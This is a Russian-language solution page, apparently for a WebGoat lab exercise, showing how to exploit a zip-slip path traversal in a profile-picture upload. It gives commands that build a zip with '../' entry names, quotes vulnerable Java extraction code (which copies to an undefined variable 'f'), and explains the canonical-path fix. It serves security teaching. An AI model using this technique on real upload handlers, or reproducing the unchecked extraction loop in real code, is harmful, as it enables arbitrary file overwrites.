@@ -1,0 +1,48 @@
+=== Решение
+
+Сначала создадим zip-файл с изображением внутри:
+
+[source, subs="macros"]
+----
+curl -o webwolf.jpg webWolfRootLink:images/wolf.png[noLink, target=images/wolf.png]
+zip profile.zip webwolf.jpg
+----
+
+Теперь давайте загрузим это как наше изображение профиля. Мы видим, что ничего не происходит, как и упоминалось в задании, в программном обеспечении есть ошибка, и результат, который мы видим на экране:
+
+[source]
+----
+Zip-файл извлечен успешно, не удалось скопировать изображение. Пожалуйста, свяжитесь с нашей службой поддержки.
+----
+
+Давайте создадим zip-файл, который перемещается наверх, а затем обратно в указанный каталог в задании.
+
+Сначала создадим структуру каталогов:
+
+[source, subs="macros"]
+----
+mkdir -p webGoatTempDir:temppath[]PathTraversal/username:user[]
+cd webGoatTempDir:temppath[]PathTraversal/username:user[]
+curl -o username:user[].jpg webWolfRootLink:images/wolf.png[noLink, target=images/wolf.png]
+zip profile.zip ../../../../../../../..webGoatTempDir:temppath[]PathTraversal/username:user[]/username:user[].jpg
+----
+
+Теперь, если мы загрузим этот zip-файл, он решит задачу.
+
+=== Почему это сработало?
+
+В коде разработчики использовали следующий фрагмент:
+
+[source%linenums]
+----
+ZipFile zip = new ZipFile(uploadedZipFile);
+Enumeration<? extends ZipEntry> entries = zip.entries();
+while (entries.hasMoreElements()) {
+  ZipEntry e = entries.nextElement();
+  File profilePicture = new File(uploadDirectory, e.getName());
+  InputStream is = zip.getInputStream(e);
+  Files.copy(is, f.toPath(), StandardCopyOption.REPLACE_EXISTING);
+}
+----
+
+Исправление заключается в том, чтобы убедиться, что полученный файл в строке 5 находится в ожидаемом каталоге. Как и в случае с предотвращением обхода пути, используйте `profilePicture.getCanonicalPath()`, чтобы убедиться, что путь такой же, как вы ожидаете.
